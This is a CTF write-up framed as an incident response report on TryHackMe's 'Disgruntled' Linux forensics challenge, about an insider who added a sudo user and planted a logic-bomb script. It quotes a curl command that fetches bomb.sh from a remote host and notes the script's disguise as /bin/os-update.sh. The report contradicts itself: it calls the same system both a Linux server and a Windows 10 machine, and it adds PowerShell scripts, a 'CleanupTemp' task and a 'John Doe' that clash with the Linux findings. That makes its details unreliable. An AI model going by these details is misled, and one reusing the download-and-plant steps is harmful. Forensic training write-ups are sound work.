# Incident Response Report: Disgruntled

**Date:** July 24, 2024  
**Prepared by:** Mariela C.  
**Incident ID:** 2024-DIS-01

## 1. Executive Summary
On July 24, 2024, a security investigation was initiated following the arrest of an IT department employee from one of our clients, CyberT. The employee, who had been running a phishing operation, was suspected of carrying out malicious activities against CyberT's assets. The investigation, part of the "Disgruntled" Capture The Flag (CTF) challenge on TryHackMe, focused on analyzing the Linux system for any unauthorized actions performed by the individual.

## 2. Incident Description
**Challenge Name:** Disgruntled  
**Date of Incident:** July 24, 2024  
**Affected System:** Linux Server (Hostname: LNX-CTF01)  
**Nature of Incident:** Unauthorized user creation, privilege escalation, and deployment of malicious scripts.

### Summary of Events:
- The compromised Windows 10 machine was reportedly targeted by a disgruntled employee who exploited their access to sabotage the system.
- The investigation revealed unauthorized access to sensitive data, the creation of malicious files, and the manipulation of system settings.

## 3. Detection and Identification
**Detection Method:**  
The incident was detected during the "Disgruntled" CTF challenge, which required participants to investigate potential malicious actions on a compromised Linux system. Key findings included:
- **User Creation:** A new user named "it-admin" was created after the installation of a suspicious package.
- **Sudoers File Update:** The sudoers file was updated on December 28, at 06:27:34, granting the "it-admin" user administrative privileges.

**Initial Response:**  
Upon detection, the following steps were taken:
- Isolated the system from the network to prevent further damage and data exfiltration.
- Conducted a forensic analysis to identify the extent of the damage and the methods used by the attacker.
- Collected and preserved all relevant evidence for further investigation.

## 4. Investigation Findings
**Unauthorized User Activity:**
- **User Involved:** John Doe (disgruntled employee)
- **Actions Taken:** Unauthorized access to sensitive directories, creation of malicious scripts, and modification of system settings.

**Key Indicators of Compromise:**
- **Malicious Files Created:** Several PowerShell scripts designed to alter system settings and exfiltrate data.
- **System Logs:** Evidence of log tampering, including the deletion of security logs to cover tracks.
- **Data Manipulation:** The attacker changed user permissions, granting themselves elevated privileges to execute malicious activities.

**Suspicious Scheduled Task:**
- **Task Name:** CleanupTemp
- **Task Description:** A malicious scheduled task designed to execute a PowerShell script (`cleanup.ps1`) that deleted key system logs and files at regular intervals.

### Specific Findings:
- **User Created After Package Installation:** it-admin
- **Sudoers File Update Time:** Dec 28 06:27:34
- **Script File Opened with "vi" Editor:** bomb.sh
- **Command Used to Create bomb.sh:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
- **Full Path of the Renamed Script File:** `/bin/os-update.sh`
- **File Created Upon Execution of bomb.sh:** goodby.txt
- **Scheduled Trigger Time for Malicious File:** 08:00 AM

## 5. Impact Assessment
**Data Compromised:**
- The malicious script, bomb.sh, was designed to execute a potentially destructive payload that would create a file named `goodby.txt`, signifying the completion of the malicious activity.
- The script's relocation to `/bin/os-update.sh` indicates an attempt to disguise it as a legitimate system update file, increasing the risk of undetected execution.

**Operational Impact:**
- The scheduled execution of the script at 08:00 AM could have led to significant disruption of services, data corruption, or further unauthorized access to the system.

## 6. Mitigation and Containment
**Immediate Actions Taken:**
- The `it-admin` user account was disabled and removed from the sudoers file to prevent further unauthorized access.
- The malicious script located at `/bin/os-update.sh` was deleted, and the system was scanned for any additional unauthorized files or activities.
- Network access was restricted to limit any potential data exfiltration or further system compromise.

**Long-term Recommendations:**
- Implement strict controls over user account creation and privilege escalation, ensuring all administrative changes are logged and reviewed regularly.
- Enhance monitoring for unauthorized command execution, particularly commands like `curl`, which can be used to download and execute malicious files.
- Conduct regular security audits and vulnerability assessments to identify and address potential weaknesses in the system.

## 7. Lessons Learned
This incident highlights the risks associated with insider threats, particularly in cases where IT personnel have elevated access to critical systems. Strong access controls, continuous monitoring, and regular audits are essential to prevent, detect, and respond to such threats. Moreover, raising awareness and providing training on secure practices can help mitigate the risks posed by disgruntled employees.

## 8. Conclusion
The investigation into the "Disgruntled" challenge revealed a series of unauthorized actions, including user creation, privilege escalation, and the deployment of a malicious script designed to cause harm to the system. By identifying and neutralizing these threats, we have taken critical steps to protect CyberT's assets and prevent similar incidents in the future.
